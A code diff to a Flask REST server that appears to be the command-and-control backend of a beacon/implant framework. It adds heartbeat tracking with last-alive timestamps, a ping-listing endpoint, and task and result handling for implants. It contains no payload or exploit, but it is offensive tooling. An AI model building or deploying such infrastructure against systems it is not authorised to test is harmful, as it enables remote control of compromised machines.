@@ -1,6 +1,7 @@
 #!/usr/bin/python3
 import json
 import os
+import datetime
 
 from flask import request, Response, send_from_directory, jsonify
 from flask_restful import Resource
@@ -67,31 +68,39 @@ class Registers(Resource):
                 # Look for beacon UUID and add it to our list
                 if (key == "beacon_id"):
                     my_list.append(json_obj[key])
-                    print(my_list)
             Register(**json_obj).save()
             return "Sucess!", 200
         else:
             return "Failed!", 400
 
 class Ping(Resource):
-    def get(self):
-        # Get all the objects and return them to the user
-        ping = Pinger.objects().to_json()
-        #Pinger.objects().delete()
-        return Response(ping, mimetype="application/json", status=200)
-    
-    def post(self):
+    def post(self,beaconid):
         # Check if results from the implant are populated
         if str(request.get_json()) != '{}':
             # Parse out the result JSON that we want to add to the database
             body = request.get_json()
             json_obj = json.loads(json.dumps(body))
-            # Add a beacon UUID to each result object for tracking
-            #json_obj['beacon_id'] = uuid_b
-            Pinger(**json_obj).save()
+            data = Pinger.objects().to_json()
+
+            if beaconid not in data:
+                date_time = datetime.datetime.now().strftime("%H:%M:%S")
+                json_obj['last_alive'] = date_time
+                Pinger(**json_obj).save()
+            else:
+                date_time = datetime.datetime.now().strftime("%H:%M:%S")
+                beacon = Pinger.objects(beacon_id=beaconid).first()
+                beacon.update(last_alive=date_time)
+            
             return "Success!", 200
         else:
             return "Failed!", 400
+
+class CheckPings(Resource):
+    def get(self):
+        # Get all the objects and return them to the user
+        ping = Pinger.objects().to_json()
+        Pinger.objects().delete()
+        return Response(ping, mimetype="application/json", status=200)
 
 class Tasks(Resource):
     # ListTasks
@@ -138,7 +147,6 @@ class Results(Resource):
     def get(self,beacon_id):
         if beacon_id in my_list:
             results = Result.objects().to_json()
-            print(results)
             Result.objects().delete()
             return Response(results, mimetype="application/json", status=200) # Get all the result objects and return them to the user
         else:
